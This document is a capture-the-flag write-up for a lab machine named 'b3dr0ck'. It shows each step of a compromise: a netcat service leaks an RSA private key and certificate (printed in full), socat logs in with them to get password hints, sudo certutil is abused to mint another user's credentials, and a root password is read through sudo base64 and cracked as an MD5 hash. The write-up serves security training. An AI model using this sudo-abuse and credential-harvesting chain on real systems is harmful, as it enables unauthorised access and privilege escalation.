# What is the barney.txt flag?


- Did port scan with `rustscan`.
- Connected to port `9009` with `netcat`.
- Got a private RSA key and a certificate  .

```console
❯ nc 10.10.119.255 9009


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoBhkQaEJ9NvBhJAJObgjDWjZ/EPXvw41s/eovjpm6FNmD/2I
ZE/98k6xBb9zQ8LfgGcx302HggNMyGC5kF1ebI6QCbHxwWTzmqIR5tfa5MG/0bSE
peDHjihn+eB94hfo/eCSyRsCH05FSwqMJgXrMKJbQOnDd24YchWcj102MnFdW4Hx
/BTNkseKET8tYbB/mUyMkPWHLCxeQ5zuT8Bk5KIpZGgSobT2CU+pVhWGrepArzRL
Pv5NvqaPCE4cCZkFSzXRT3n5P4eng4l8ZeYofuemuWTl9XGntjN9iAW4dizK6ned
bRpLBPKQPT5ceerhXiBbbYnZnfvp9k1IpkhI0QIDAQABAoIBAQCf/2CK+n9x2AIy
EqU1qyJU73oTlFXU2kWvg45/9uwLufWhe3dJEWyxMhXWsbxndyVZNUjxa5FGzTd6
drhdYALTKTMojU8YQWT4IIsVkppvznZ/BRMgmGG3YAhyAPqt78lpmHv6QmS/lsDH
u1XPVlDzfP8IA9fWzw/dTF34JWbZxz+fEqqpC2HvrsvFNGe19hF6O7wwTonCCU/P
7Wf2BXT6cYDefWlGqLhha1ngQAmaeptBITBjk8B2N6gbPUa7QM+XGYUKVVJoIIxm
+Q/mKB3GP4dN6TLZ+ZRjF6UI0k0lKFLzP7puMv3v39FAoLWbmvjRzr5IlCtnCWWp
6WPbfeABAoGBAM0srpd1mtPVy5y2TYsHoq3azKmqX7QSya0EnsCjHpRiO05ypniY
80TEx/8ZrDdSsAzbgKfwUkN2VLvTkCluh3AVHDDqdWebsEd8kTuuNS3JfW/Rf2bm
2nmHeLDJt9ZlgkLl0RmnyyQg1Ez/y/lFZ08OzLp7flJeJ+qx+fdmZJLRAoGBAMfA
+FRs1gbH59vYRo1ffd5gH0vDhMFvHq8JasxVYBp/xfkfXETUtMRCSJdU7iG8wtnp
RHravj0EFE+CyHQ8SZnm53OcV6KN+BZ7PoCMMlZ8CCtqtOvk/2mzH/AGNoCJWXKO
zuI9xhTfgc5HLuiwiOKxyxEMzSbD7FJFqXea2dYBAoGAbzuMI9zEZZgA3SMQgxFO
psZ6MnmFjRCqebyJfJJyn6tpz6vkiHkTWfL9IlX+wbd4bmAKLgHh92UNpw6Zl3yu
vJsVP4e8wsDrHrZv3lUhy4LzGE4Rre31//DsA5w4qGk755zEcg4/2YRa1KvRH4D6
8ydo4qjU4T7ekSSQCgpe+CECgYALW09DDYUFkav+9cbdFsbDM9fTqOQNU1H9RZ3K
zDfQid8pkLzgNO+qENKrt+pqBJ9XYEnCallSgr7c3mSjJyJQG66hBgx9c3DdZlhh
WpcqD5cvULvEhZp32fVA4jmLCUQKnU/p0PVIDoUEw0tJc2/044LWD1JCl/UBoHBI
Goe0AQKBgGQul9cYDtGr8uu1jL5z0gAmTEYxFRTN8yM3QJFItFq9SJl1L/wlvPHN
SCLXGvk6cyLMn2D6YvK1S8SW444CjrrcKl1YvkRZ3wH8S8c2CS22VgEgVfF3Eav3
rvKMhGYDjzbZbSQSAtx8KNXV62yaNrrX4mHJ+1aUpK+1tth00yuQ
-----END RSA PRIVATE KEY-----


What are you looking for? cert
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjEyMTUxMjIyMTJaFw0yMzEyMTUxMjIyMTJaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCgGGRB
oQn028GEkAk5uCMNaNn8Q9e/DjWz96i+OmboU2YP/YhkT/3yTrEFv3NDwt+AZzHf
TYeCA0zIYLmQXV5sjpAJsfHBZPOaohHm19rkwb/RtISl4MeOKGf54H3iF+j94JLJ
GwIfTkVLCowmBeswoltA6cN3bhhyFZyPXTYycV1bgfH8FM2Sx4oRPy1hsH+ZTIyQ
9YcsLF5DnO5PwGTkoilkaBKhtPYJT6lWFYat6kCvNEs+/k2+po8IThwJmQVLNdFP
efk/h6eDiXxl5ih+56a5ZOX1cae2M32IBbh2LMrqd51tGksE8pA9Plx56uFeIFtt
idmd++n2TUimSEjRAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAIVjYDBma81z3ArB
gtfFgQu8Vf086ysSxgFpP+pdxgBTF47R4tCQ0CHvgb4mXWmYNpK6FGSWAZtspma8
nSisuCJVpJcVreIP4HifXUFwU2Rj1+cOSzuA4NBUqvyy+nuaaL4iRq6CV+YOg/rf
U0sFqp0IwNej8TWfdKJrhE/o+9sobND2T4ksWkkSecnlQuJRErArOfJ1WCbrzECt
fjAlft9ObdVPe5jkPnqyw957arKM/52WiLnoMefBOJKzDt7SF/P8xsTbiLp3LPoz
fUnkxHElD0yyBLONzEcLIov91A+4DnRqmthPi4vJE/tHN9rk5QjgCoPocBVf/BYg
kNPmEAg=
-----END CERTIFICATE-----


What are you looking for? sd
Sorry, unrecognized request: 'sd'

You use this service to recover your client certificate and private key

```


- We can then connect to the server at `54321` with `socat` by specifying the given key and certificate

```console
❯ socat stdio SSL:10.10.119.255:54321,cert=cert,key=key,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> password
Password hint: <REDACTED> (user = 'Barney Rubble')
b3dr0ck> 
```

- Logged in to ssh as Barney with the password specified and found `barney.txt`. 

```console
❯ ssh barney@10.10.119.255
The authenticity of host '10.10.119.255 (10.10.119.255)' can't be established.
ED25519 key fingerprint is SHA256:CFTFQcdE19Y7z0z2H7f+gsTTUaLOiPE1gtFt0egy/V8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.119.255' (ED25519) to the list of known hosts.
barney@10.10.119.255's password: 
barney@b3dr0ck:~$ ls
barney.txt
barney@b3dr0ck:~$ cat barney.txt 
<REDACTED>

```


# What is fred's password?



- On doing `sudo -l` found that we can run `certutil` as `root`. 

```console
barney@b3dr0ck:~$ sudo -l
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil

```

- Listed keys

```console
barney@b3dr0ck:~$ certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 72
drwxrwxr-x 2 root root 4096 Dec 15 12:51 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Dec 15 12:22 barney.certificate.pem
-rw-r----- 1 root root 1674 Dec 15 12:22 barney.clientKey.pem
-rw-r----- 1 root root  894 Dec 15 12:22 barney.csr.pem
-rw-r----- 1 root root 1674 Dec 15 12:22 barney.serviceKey.pem
-rw-r----- 1 root root  976 Dec 15 12:22 fred.certificate.pem
-rw-r----- 1 root root 1674 Dec 15 12:22 fred.clientKey.pem
-rw-r----- 1 root root  898 Dec 15 12:22 fred.csr.pem
-rw-r----- 1 root root 1674 Dec 15 12:22 fred.serviceKey.pem
-rw-r--r-- 1 root root  980 Dec 15 12:51 urlfetch.certificate.pem
-rw-r--r-- 1 root root 1674 Dec 15 12:51 urlfetch.clientKey.pem
-rw-r--r-- 1 root root  906 Dec 15 12:51 urlfetch.csr.pem
-rw-r--r-- 1 root root 1674 Dec 15 12:51 urlfetch.serviceKey.pem
```


- Got key for `fred` 

```console
barney@b3dr0ck:~$ sudo -u root certutil -urlfetch fred.certificate.pem
Generating credentials for user: urlfetch (fredcertificatepem)
Generated: clientKey for urlfetch: /usr/share/abc/certs/urlfetch.clientKey.pem
Generated: certificate for urlfetch: /usr/share/abc/certs/urlfetch.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA7tSzucRoeACRavSmkmCldxCC1QaGm8C3DN5N87vWdnJ1BFuX
njM2L9EIz4vjhbJX9fUD0VViJ5gdxVOfKTuLJM7hXXR99GYiP71bbZW0cdg3SUpP
PX5kYBXDrJuZEjLXwwbdtgsnh6/FBxMoLl3Lw3dxGMn706KbsXqZDCtY9miMHL8n
t0bz2Kq0AIdFXxd0HCtkCBeAakOU6fYZ68xYJ0q2wfzGpmaf9oVVEpYcF3Wppr3t
2zGZGC5gndN0w/Fe/5uDYU4ZZuxxaXYLKalVULVCfhKZ5tIV+cRtilywtngZNDOd
zOugk7sJMvaE4hnR0TreHtpi9zqy2wS0mnVYPwIDAQABAoIBAHDsWyorpqWOxzMG
CDhPwAyi3ulwU3cTULmh5sOmfcm1ZoSv9elUF3vWX08aunI9l/9wYOS6dVV5RCJH
3op1X94Af2hbqy5CmFEA7FjNHutxKvrZSswtlbIkuEdFrsN/DKtm9K+daIxsXEFz
Gl2J9c0vDWeGIS64xNrOt8ycNk0Sybp3g2EtnM8TebQZge9sKgj62byZK3FCJ2AZ
86FW1KjajhpFlHeVc7dJukm/9T6IZerQWCYxLC5AgWjz7IDEhyZ8VHMJB6BFE83h
Lwsk3ywYQ/ZKDEBGTD1XeoO6fv63w6Xe0jp31ueAtaeyte4zq7Gl6BroTG7v8f9j
EdR5X8ECgYEA/iiBpzat/oj+WzXjZoMkzLXYhj0d3iYWQ7kvNqfCQUIAV5ABASK7
rJxBgSbKlJ/orv2mI/2UcfkHpH1PzjzW3xZ1wiBSquWmo+tDH4wohjTT5K7wTDNl
MIw8H5TAle6GS2kxU/O9m9JH06gygupC08cjPNNafLEhaGp5Onckvp8CgYEA8I/C
86M2nxJak3fsh8iB9n6QYDSmLPDYp/FXmVKb44+mVM/bDL5uxWmR5P5jw7CCNe1O
Y6hqTM6pbUI38kOEBD5pJypAL9jY6kbH2gHZMDC+ztjXWbf/ax5wWwTo+N+7Qhwu
zxzZcTXPAG7+4eXIjVMiwqgRE5g5ON1XIVjIImECgYAxYy+mjZKL9pTupm8U2YEK
In/7vd6S73W+HTsWdMzjn26vlTUMwnITnZ2A+ke9T8GIV5O0RK9W4lxg01Txr5LV
cOjbGyrVOKEEE1BMzhCF27gdJP1e4VHVeDqqrF4sBFimSL+kH6YFpHv+nh2KoPjx
bC3lwPBBcK4cOyxpdwN14wKBgBKFnycPLAd3bE3qb+XMhGUsPYWKyDixmpzjsjD1
8VbGGrJxBpammvTMOhV9mMTadEwep2h48SZUyyrEbHZUyHdjLsl7MVH9ykXPiVe5
yLUzK53ViE86IYpn35LCgAWZhFuEu/3qZLuYvwVzhmByRszK1+RQ+G+fytgcArdo
lJBBAoGBALs8LZX0jZ+xPyTC6z6wxfDE6VDcb1p32/8ilp+y9h/QHm/Cxf4q+C/o
jSOMuYOT69veAycws6x0BRphmN4c1B/Gtlit/k+kzJGf0jOkUwfCTchQ6dNskUwl
CTX3GEF+e33cnotfePzkioL2HmsMihA62rMd56xRKZRv55iICzIA
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICpjCCAY4CAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjEyMTUxMjU1NDBaFw0yMjEyMTYxMjU1NDBaMB0xGzAZBgNVBAMMEmZy
ZWRjZXJ0aWZpY2F0ZXBlbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AO7Us7nEaHgAkWr0ppJgpXcQgtUGhpvAtwzeTfO71nZydQRbl54zNi/RCM+L44Wy
V/X1A9FVYieYHcVTnyk7iyTO4V10ffRmIj+9W22VtHHYN0lKTz1+ZGAVw6ybmRIy
18MG3bYLJ4evxQcTKC5dy8N3cRjJ+9Oim7F6mQwrWPZojBy/J7dG89iqtACHRV8X
dBwrZAgXgGpDlOn2GevMWCdKtsH8xqZmn/aFVRKWHBd1qaa97dsxmRguYJ3TdMPx
Xv+bg2FOGWbscWl2CympVVC1Qn4SmebSFfnEbYpcsLZ4GTQznczroJO7CTL2hOIZ
0dE63h7aYvc6stsEtJp1WD8CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAMxOAKWPk
v/eFEHLbj4KW5K3cdcnO3YztKTg0d1AJ6TM7hJqs3/UkPHyq0kpezqYUd3ugTbUY
u+78XfbLMuUDk778EDmn/Oqe39R2urFUwIdRpsjHFK8mFw1psejjEr3/ANNpuADi
RXNE0jvjsAgqYDsoBsuKv/YR8FkFV6pEss70R77rffK+J9N6iQ1BRSWjSck5z5Hz
nh5d2kxACtvvrhDlmYHtigeTA/CgobRLN1xEgzeNEl6tYh8eNB3+x97lUWT1g2m0
lwiEwR9v8kr4LX/gJLAicfLeqSxxuQnKh0nXHD3tVcnpfh0bhOyQyHURJ+gSzFIF
fXCP56ujlndOoA==
-----END CERTIFICATE-----
```

- Saved these to `key-fred` and `cert-fred` respectively.
- Again connected to `54321`, but this time with Fred's key and certificate.

```console
❯ socat stdio SSL:10.10.119.255:54321,cert=cert-fred,key=key-fred,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'fredcertificatepem' is authorized.
b3dr0ck> password
Password hint: <REDACTED> (user = 'fredcertificatepem')

```

# What is the fred.txt flag?

- Logged in to ssh as `fred` and the given password and `fred.txt`.

```console
❯ ssh fred@10.10.119.255
fred@10.10.119.255's password: 
fred@b3dr0ck:~$ ls
fred.txt
fred@b3dr0ck:~$ cat fred.txt
<REDACTED>
```



# What is the root.txt flag?

- We can run `/usr/bin/base64 /root/pass.txt` as root without password.

```console
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```


- Got `md5 -> base64 -> base32 -> base64`  passoword.

```console
fred@b3dr0ck:~$ sudo -u root /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d  | base64 -d
a00a12aad6b7c16bf07032bd05a31d56

# ATTACKER MACHINE
❯ echo "a00a12aad6b7c16bf07032bd05a31d56" | hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 
Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

```

- Cracked this hash from [crackstation](https://crackstation.net/) and got the password for root 

- Changed user to root and found the flag

```console
fred@b3dr0ck:~$ su root
Password: 
root@b3dr0ck:/home/fred# cd
root@b3dr0ck:~# ls
pass.txt  root.txt  snap
root@b3dr0ck:~# cat root.txt 
<REDACTED>
root@b3dr0ck:~# 
```
